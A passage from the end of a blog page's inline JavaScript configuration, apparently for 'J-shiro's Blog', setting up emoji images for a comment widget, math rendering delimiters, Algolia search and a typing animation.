:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"zh-CN",pageSize:10,placeholder:"你的评论 ...",recordIP:!0,serverURLs:"https://wagpk3sa.api.lncldglobal.com",visitor:!0}},data:{"id-1":"J-shiro's Blog","id-2":"J-shiro's Blog"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{algoliaAppID:"GZT24PWKNT",algoliaIndex:"index",algoliaSearchKey:"634ab679e825b815de2663de38908f9d",highlightTag:"em",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:50,type:"algolia"},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"id-1":["id-1"],"id-2":["id-2"]},duration:-1,speed:100}}</script><script src=/js/theme.min.js></script></body></html>